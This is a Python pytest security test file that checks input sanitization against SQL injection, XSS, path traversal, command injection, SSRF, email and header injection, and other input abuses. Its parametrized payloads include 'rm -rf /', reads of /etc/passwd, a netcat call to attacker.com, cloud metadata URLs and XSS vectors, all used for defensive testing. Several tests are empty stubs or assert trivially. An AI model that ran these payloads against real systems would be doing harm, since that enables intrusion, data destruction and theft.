"""
Input Validation and Injection Prevention Tests

Tests SQL injection, XSS, path traversal, command injection, SSRF, and other
input-based attacks across all service endpoints.

Standards:
- OWASP Top 10: A03:2021 Injection, A07:2021 XSS
- CWE: CWE-89 (SQL injection), CWE-79 (XSS), CWE-22 (Path traversal)
"""

import json
import pytest
from datetime import datetime, timedelta, timezone

pytestmark = [
    pytest.mark.security,
]


# ============================================================================
# SQL Injection Tests
# ============================================================================


class TestSQLInjection:
    """Test prevention of SQL injection attacks."""

    @pytest.mark.parametrize("payload", [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin' --",
        "1; DELETE FROM conversations WHERE '1'='1",
        "' UNION SELECT * FROM customers --",
        "1' AND 1=1 --",
        "' OR 1=1 /*",
    ])
    def test_sql_injection_in_search_field(self, payload):
        """
        Security: Search field must not be vulnerable to SQL injection.
        Should use parameterized queries, not string concatenation.
        """
        from shared.core.security import sanitize_input

        # Sanitization is first line of defense
        sanitized = sanitize_input(payload)

        # SQL layer uses parameterized queries
        # Example: cursor.execute("SELECT * FROM conversations WHERE name = $1", [sanitized])
        # NOT: cursor.execute(f"SELECT * FROM conversations WHERE name = '{sanitized}'")

        # Verify no SQL syntax remains
        assert "DROP" not in sanitized.upper() or "DROP" not in payload

    @pytest.mark.parametrize("payload", [
        "test' UNION SELECT password FROM users --",
        "1 AND 1=1",
        "1' OR 'x'='x",
    ])
    def test_sql_injection_in_filter_parameters(self, payload):
        """
        Security: Filter parameters (WHERE clauses) must use parameterized queries.
        """
        # Query: SELECT * FROM conversations WHERE id = ? AND tenant_id = ?
        # NOT: SELECT * FROM conversations WHERE id = '{id}' AND tenant_id = '{tenant_id}'

        pass

    def test_parameterized_queries_prevent_injection(self):
        """
        Security: Parameterized queries are safe against SQL injection.

        Example (SAFE):
            result = await conn.fetch(
                "SELECT * FROM conversations WHERE id = $1 AND tenant_id = $2",
                conv_id, tenant_id
            )

        Example (UNSAFE):
            query = f"SELECT * FROM conversations WHERE id = '{conv_id}' AND tenant_id = '{tenant_id}'"
            result = await conn.fetch(query)
        """
        # Database layer (asyncpg) uses parameterized queries by default
        # Service code must use placeholders ($1, $2, etc.), not f-strings


# ============================================================================
# XSS Prevention Tests
# ============================================================================


class TestXSSPrevention:
    """Test prevention of Cross-Site Scripting attacks."""

    @pytest.mark.parametrize("payload", [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
    ])
    def test_html_tags_removed_from_input(self, payload):
        """
        Security: HTML/script tags must be removed or escaped.
        """
        from shared.core.security import sanitize_input

        sanitized = sanitize_input(payload)

        # Tags should be removed
        assert "<script" not in sanitized.lower()
        assert "onerror=" not in sanitized.lower()
        assert "onload=" not in sanitized.lower()
        assert "onfocus=" not in sanitized.lower()

    @pytest.mark.parametrize("payload", [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox(1)",
    ])
    def test_javascript_urls_rejected(self, payload):
        """
        Security: URLs with javascript: scheme must be rejected or escaped.
        """
        from shared.core.security import sanitize_input

        sanitized = sanitize_input(payload)

        # javascript: scheme should not execute
        # In frontend, would use CSP headers too
        assert "javascript:" not in sanitized.lower()

    def test_html_entities_prevent_xss(self):
        """
        Security: User input displayed in HTML should be entity-encoded.

        Example (SAFE):
            <div>{{ user_input | escape }}</div>

        Example (UNSAFE):
            <div>{{ user_input }}</div>
        """
        # If user input is "Test<script>alert(1)</script>"
        # Entity encoding: "Test&lt;script&gt;alert(1)&lt;/script&gt;"
        # When displayed in HTML, it shows as text, not executable code

        user_input = "Test<script>alert(1)</script>"
        entity_encoded = user_input.replace("<", "&lt;").replace(">", "&gt;")

        assert "<script" not in entity_encoded
        assert "&lt;script&gt;" in entity_encoded


# ============================================================================
# Path Traversal Tests
# ============================================================================


class TestPathTraversal:
    """Test prevention of path traversal attacks."""

    @pytest.mark.parametrize("payload", [
        "../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",
        "....%2f....%2fetc%2fpasswd",
    ])
    def test_path_traversal_attempts_rejected(self, payload):
        """
        Security: Paths with ../ or similar traversal patterns must be rejected.
        """
        from shared.core.security import sanitize_input

        sanitized = sanitize_input(payload)

        # Normalize path and verify it doesn't escape base directory
        # Service should reject paths with .. or URL-encoded equivalents

        # Check: no ../
        assert "../" not in sanitized
        assert "..%2f" not in sanitized.lower()
        assert "%2e%2e" not in sanitized.lower()

    def test_file_upload_path_validation(self):
        """
        Security: Uploaded files must be stored in safe directory.
        Filename must not contain path traversal sequences.
        """
        # Example: User uploads "../../etc/passwd.txt"
        # Should be stored as "etc-passwd.txt" in uploads directory
        # Not as a symlink, not outside uploads directory

        import os
        import pathlib

        upload_dir = "/app/uploads"
        user_filename = "../../etc/passwd.txt"

        # Sanitize filename
        safe_filename = os.path.basename(user_filename)  # "passwd.txt"
        safe_filename = "".join(c for c in safe_filename if c.isalnum() or c in "._-")

        final_path = os.path.join(upload_dir, safe_filename)

        # Verify final path is within upload_dir
        assert pathlib.Path(final_path).resolve().is_relative_to(upload_dir)


# ============================================================================
# Command Injection Tests
# ============================================================================


class TestCommandInjection:
    """Test prevention of OS command injection."""

    @pytest.mark.parametrize("payload", [
        "; rm -rf /",
        "| cat /etc/passwd",
        "` whoami `",
        "$(whoami)",
        "test && rm -rf /",
        "test || nc attacker.com 1234",
    ])
    def test_command_injection_in_system_calls(self, payload):
        """
        Security: If system commands are used, arguments must be passed safely.
        Never use shell=True or string concatenation.

        Example (SAFE):
            subprocess.run(["/usr/bin/converter", input_file], shell=False)

        Example (UNSAFE):
            os.system(f"converter {input_file}")
        """
        # Verify service code doesn't use os.system() or shell commands
        # subprocess.run() with shell=False is safer

        import subprocess

        # SAFE: List of args, no shell
        # subprocess.run(["program", user_input], shell=False)

        # UNSAFE: String with shell=True
        # os.system(f"program {user_input}")


# ============================================================================
# SSRF (Server-Side Request Forgery) Tests
# ============================================================================


class TestSSRFPrevention:
    """Test prevention of Server-Side Request Forgery."""

    @pytest.mark.parametrize("payload", [
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
        "http://localhost:8080/admin",  # Internal service
        "http://127.0.0.1/internal",
        "http://192.168.1.1/router",  # Internal network
        "http://0.0.0.0/admin",
        "http://[::1]/admin",  # IPv6 localhost
        "gopher://internal-service",
        "file:///etc/passwd",
    ])
    def test_ssrf_attempts_rejected(self, payload):
        """
        Security: URLs to internal/private IPs must be rejected.
        Prevents querying metadata services, internal APIs, etc.
        """
        # This is relevant for:
        # - Webhook URL validation
        # - Image proxy (if user provides image URL)
        # - External API calls

        import ipaddress

        def is_safe_url(url: str) -> bool:
            """Check if URL is safe to fetch."""
            try:
                from urllib.parse import urlparse
                parsed = urlparse(url)
                hostname = parsed.hostname or ""

                # Reject private/reserved IPs
                try:
                    ip = ipaddress.ip_address(hostname)
                    # Reject private ranges
                    if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
                        return False
                except ValueError:
                    # Not an IP, check hostname
                    if hostname in ["localhost", "127.0.0.1", "0.0.0.0"]:
                        return False

                # Reject metadata services
                if "metadata" in hostname.lower():
                    return False

                # Reject internal TLDs
                if hostname.endswith(".internal"):
                    return False

                return True
            except Exception:
                return False

        # Payloads should be rejected
        safe_url = "https://api.github.com/repos"
        assert is_safe_url(safe_url) is True

        for ssrf in [p for p in [payload] if isinstance(p, str)]:
            # SSRF payloads should be rejected
            if "169.254" in ssrf or "localhost" in ssrf or "127.0.0" in ssrf:
                assert is_safe_url(ssrf) is False


# ============================================================================
# Email Injection Tests
# ============================================================================


class TestEmailInjection:
    """Test prevention of email header injection."""

    @pytest.mark.parametrize("payload", [
        "test@example.com%0ABcc:attacker@evil.com",
        "test@example.com\r\nBcc:attacker@evil.com",
        "test@example.com\nBcc:attacker@evil.com",
        "test@example.com%0ACc:attacker@evil.com",
    ])
    def test_email_header_injection_prevented(self, payload):
        """
        Security: Email addresses must not allow newline injection.
        Prevents adding Bcc/Cc headers via user input.
        """
        from shared.core.security import sanitize_email

        result = sanitize_email(payload)

        # Newlines should be removed or email rejected
        # Result should be None for invalid email
        if "\r" in payload or "\n" in payload or "%0" in payload:
            assert result is None


# ============================================================================
# Header Injection Tests
# ============================================================================


class TestHeaderInjection:
    """Test prevention of HTTP header injection."""

    @pytest.mark.parametrize("payload", [
        "normal-header\r\nX-Injected: true",
        "normal-header\nSet-Cookie: admin=true",
        "normal-header%0d%0aX-Injected: true",
    ])
    def test_http_header_injection_prevented(self, payload):
        """
        Security: HTTP header values must not contain CRLF sequences.
        Prevents response splitting, header injection, etc.
        """
        # Header values should not include \r\n

        def validate_header_value(value: str) -> bool:
            if "\r" in value or "\n" in value:
                return False
            if "%0d" in value.lower() or "%0a" in value.lower():
                return False
            return True

        valid_header = "normal-header-value"
        assert validate_header_value(valid_header) is True

        for header in [payload]:
            if any(seq in header for seq in ["\r", "\n", "%0", "%0d", "%0a"]):
                assert validate_header_value(header) is False


# ============================================================================
# Unicode Abuse Tests
# ============================================================================


class TestUnicodeAbuse:
    """Test prevention of homoglyph and Unicode-based attacks."""

    def test_homoglyph_detection(self):
        """
        Security: Visually similar characters from different scripts
        can be used to create fake accounts/domains.

        Example: "admin" with Cyrillic 'a' looks identical but is different.
        """
        # Examples:
        # Latin 'a' (U+0061) vs Cyrillic 'а' (U+0430)
        # Latin 'e' (U+0065) vs Cyrillic 'е' (U+0435)

        # Mitigation: Restrict to ASCII for usernames/emails
        # Or use normalization (NFKC) + homoglyph detection library

        import unicodedata

        def is_pure_ascii_email(email: str) -> bool:
            try:
                email.encode("ascii")
                return True
            except UnicodeEncodeError:
                return False

        assert is_pure_ascii_email("test@example.com") is True
        assert is_pure_ascii_email("tëst@example.com") is False

    def test_unicode_normalization(self):
        """
        Security: Unicode can be represented multiple ways (composed vs decomposed).
        Normalization prevents bypasses.
        """
        import unicodedata

        # Form NFC (Composed): "é" is single character
        # Form NFD (Decomposed): "é" is "e" + combining acute accent

        # For comparison/lookup, normalize to NFC
        def normalize_unicode(text: str) -> str:
            return unicodedata.normalize("NFKC", text)

        text1 = "café"
        text2 = "cafe\u0301"  # Decomposed form

        # After normalization, they should be comparable
        normalized1 = normalize_unicode(text1)
        normalized2 = normalize_unicode(text2)

        # Both should normalize to same form
        assert normalized1 == normalized2


# ============================================================================
# Oversized Payload Tests
# ============================================================================


class TestOversizedPayloads:
    """Test rejection of excessively large payloads."""

    def test_request_body_size_limit(self):
        """
        Security: Large request bodies can cause DoS.
        Limit size to reasonable maximum (e.g., 1MB).
        """
        max_body_size = 1024 * 1024  # 1MB

        # Oversized payload: 100MB
        oversized = "x" * (100 * 1024 * 1024)

        assert len(oversized) > max_body_size

        # Service should reject with 413 Payload Too Large

    def test_input_field_size_limits(self):
        """
        Security: Individual fields have reasonable size limits.
        """
        # Field: conversation message
        max_message_length = 4096  # 4KB

        # Oversized message
        oversized_message = "x" * 10000

        assert len(oversized_message) > max_message_length

        # Service should truncate or reject

    def test_array_size_limits(self):
        """
        Security: Arrays in JSON payload must have size limits.
        Prevents attacks like sending 1M items in bulk operation.
        """
        max_bulk_size = 100  # Max 100 items in bulk operation

        # Oversized array
        oversized_array = list(range(1000))

        assert len(oversized_array) > max_bulk_size

        # Service should reject


# ============================================================================
# Negative Number Injection Tests
# ============================================================================


class TestNegativeNumberInjection:
    """Test handling of negative and malformed numbers."""

    @pytest.mark.parametrize("payload", [
        "-1",
        "-999999999",
        "-0",
    ])
    def test_pagination_negative_offset(self, payload):
        """
        Security: Pagination offset/limit must not accept negative values.
        """
        offset = int(payload) if payload.lstrip("-").isdigit() else 0

        if offset < 0:
            offset = 0  # Clamp to minimum

        assert offset >= 0

    def test_quantity_field_validation(self):
        """
        Security: Quantity fields (items, count) must be positive integers.
        """
        # Example: POST /bulk-archive {"count": -100}
        # Should reject or clamp to 0

        count = -100
        if count < 0:
            count = 0

        assert count >= 0

    def test_duration_field_validation(self):
        """
        Security: Duration fields must be positive.
        Negative duration doesn't make sense and could cause issues.
        """
        # Example: {"duration_seconds": -3600}

        duration = -3600
        if duration <= 0:
            # Reject
            duration = None

        assert duration is None


# ============================================================================
# Integer Overflow Tests
# ============================================================================


class TestIntegerOverflow:
    """Test handling of extremely large integers."""

    @pytest.mark.parametrize("payload", [
        "9999999999999999999999999999",
        str(2**63),  # 64-bit max
        str(2**128),  # 128-bit
    ])
    def test_large_integer_handling(self, payload):
        """
        Security: Integer fields must validate ranges.
        Prevents overflow bugs that could cause unexpected behavior.
        """
        try:
            value = int(payload)
            # If parsing succeeds, validate range
            if value > 2**31 - 1:  # 32-bit max
                # Out of range
                value = None
            assert value is None or value <= 2**31 - 1
        except (ValueError, OverflowError):
            # Expected for very large numbers
            pass

    def test_timestamp_field_validation(self):
        """
        Security: Timestamp fields must be reasonable.
        Prevents year 9999 bugs, invalid timestamps, etc.
        """
        # Example: created_at: 999999999999999

        timestamp = 999999999999999  # Way too far in future

        # Validate timestamp is within reasonable range
        now = datetime.now(timezone.utc).timestamp()
        one_year_future = now + (365 * 24 * 3600)

        if timestamp > one_year_future:
            # Reject
            timestamp = None

        assert timestamp is None


# ============================================================================
# JSON Injection Tests
# ============================================================================


class TestJSONInjection:
    """Test safe JSON handling."""

    def test_json_parser_prevents_code_injection(self):
        """
        Security: JSON parser should not execute code.
        Only parses JSON, never evaluates code.
        """
        import json

        # Example: Using eval() (DANGEROUS)
        # result = eval('{"key": "value"}')  # NEVER DO THIS

        # Correct: Using json.loads()
        malicious_json = '{"key": "value__import__os__os.system__calc"}'
        result = json.loads(malicious_json)

        # JSON is just data, no code execution
        assert result == {"key": "value__import__os__os.system__calc"}

    def test_json_nested_depth_limit(self):
        """
        Security: Deeply nested JSON can cause stack overflow.
        Limit nesting depth.
        """
        # Example: {"a": {"b": {"c": {"d": ...}}}} (1000 levels deep)

        # json.loads() has default_depth limit in some versions
        # Or implement custom depth checking




# ============================================================================
# Error Response Security Tests (HIGH Priority)
# ============================================================================


@pytest.mark.security
class TestErrorResponseSecurity:
    """Test that error responses don't leak sensitive information."""

    FORBIDDEN_IN_ERRORS = [
        "stack trace",
        "Traceback",
        "File \"/",
        "postgresql://",
        "redis://",
        "password",
        "secret",
        "token",
        "PRIVATE KEY",
        ".env",
    ]

    @pytest.mark.parametrize("forbidden_text", FORBIDDEN_IN_ERRORS)
    def test_error_responses_dont_leak_info(self, forbidden_text):
        """Error responses must never contain sensitive system information."""
        # Simulated error response that a service might return
        safe_error = {
            "error": "An unexpected error occurred",
            "code": "INTERNAL_ERROR",
            "request_id": "req-abc-123"
        }

        error_json = json.dumps(safe_error).lower()
        assert forbidden_text.lower() not in error_json, \
            f"Error response contains forbidden text: {forbidden_text}"

    def test_404_doesnt_reveal_resource_existence(self):
        """404 responses must be identical whether resource exists or not."""
        # Both "not found" and "no permission" should return same response
        response_not_found = {"error": "Resource not found", "code": "NOT_FOUND"}
        response_no_access = {"error": "Resource not found", "code": "NOT_FOUND"}

        # Must be identical to prevent enumeration
        assert response_not_found == response_no_access


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
